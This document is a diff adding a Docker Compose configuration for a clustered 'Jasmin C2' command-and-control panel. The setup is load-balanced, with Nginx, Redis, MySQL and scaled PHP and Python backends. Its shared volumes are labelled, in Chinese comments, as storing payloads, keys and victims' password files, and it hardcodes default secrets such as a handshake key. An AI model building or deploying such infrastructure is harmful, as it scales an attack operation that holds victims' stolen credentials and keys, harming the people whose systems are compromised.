@@ -1,0 +1,121 @@
+# Jasmin C2 — 集群版 (Nginx负载均衡 + Redis Session + 多副本)
+# 用法: docker compose -f docker-compose.cluster.yml up -d --build --scale php=3 --scale python=2
+
+services:
+  # ── Nginx 负载均衡 ──
+  nginx:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.nginx
+    restart: unless-stopped
+    depends_on:
+      - php
+      - python
+    ports:
+      - "8080:8080"   # PHP 后台入口
+      - "5000:5000"   # Python 后台入口
+    networks:
+      - jasmin_net
+
+  # ── Redis Session 共享 ──
+  redis:
+    image: redis:7-alpine
+    restart: unless-stopped
+    command: redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru
+    volumes:
+      - redis_data:/data
+    healthcheck:
+      test: ["CMD", "redis-cli", "ping"]
+      interval: 5s
+      timeout: 3s
+      retries: 5
+    networks:
+      - jasmin_net
+
+  # ── MySQL 主库 ──
+  db:
+    image: mysql:8.0
+    restart: unless-stopped
+    environment:
+      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD:-jasmin_root_pw}
+      MYSQL_DATABASE: ${MYSQL_DATABASE:-jasmin_db}
+      MYSQL_USER: ${MYSQL_USER:-jasminadmin}
+      MYSQL_PASSWORD: ${MYSQL_PASSWORD:-jasmin_secure_pw}
+    volumes:
+      - mysql_data:/var/lib/mysql
+      - ../Web Panel/database/jasmin_db.sql:/docker-entrypoint-initdb.d/01-schema.sql:ro
+    healthcheck:
+      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
+      interval: 5s
+      timeout: 5s
+      retries: 10
+    command: --default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4
+    networks:
+      - jasmin_net
+
+  # ── PHP 后台 (可水平扩展) ──
+  php:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.php
+    restart: unless-stopped
+    depends_on:
+      db:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+    volumes:
+      - shared_payloads:/var/www/html/payloads
+      - shared_passwords:/var/www/html/passwords
+    environment:
+      GIT_TOKEN: ${GIT_TOKEN:-}
+      DB_HOST: db
+      DB_PORT: "3306"
+      DB_NAME: ${MYSQL_DATABASE:-jasmin_db}
+      DB_USER: ${MYSQL_USER:-jasminadmin}
+      DB_PASS: ${MYSQL_PASSWORD:-jasmin_secure_pw}
+      HANDSHAKE_SECRET: ${HANDSHAKE_SECRET:-jasmin@123}
+      REDIS_HOST: redis
+      REDIS_PORT: "6379"
+    networks:
+      - jasmin_net
+    deploy:
+      replicas: 2
+
+  # ── Python 后台 (可水平扩展) ──
+  python:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.python
+    restart: unless-stopped
+    depends_on:
+      db:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+    volumes:
+      - shared_payloads:/app/payloads
+    environment:
+      GIT_TOKEN: ${GIT_TOKEN:-}
+      DB_HOST: db
+      DB_PORT: "3306"
+      DB_NAME: ${MYSQL_DATABASE:-jasmin_db}
+      DB_USER: ${MYSQL_USER:-jasminadmin}
+      DB_PASS: ${MYSQL_PASSWORD:-jasmin_secure_pw}
+      HANDSHAKE_SECRET: ${HANDSHAKE_SECRET:-jasmin@123}
+      REDIS_HOST: redis
+      REDIS_PORT: "6379"
+    networks:
+      - jasmin_net
+    deploy:
+      replicas: 2
+
+volumes:
+  mysql_data:
+  redis_data:
+  shared_payloads:     # 跨实例共享: 载荷 + 密钥
+  shared_passwords:    # 跨实例共享: 受害者密码文件
+
+networks:
+  jasmin_net:
+    driver: bridge
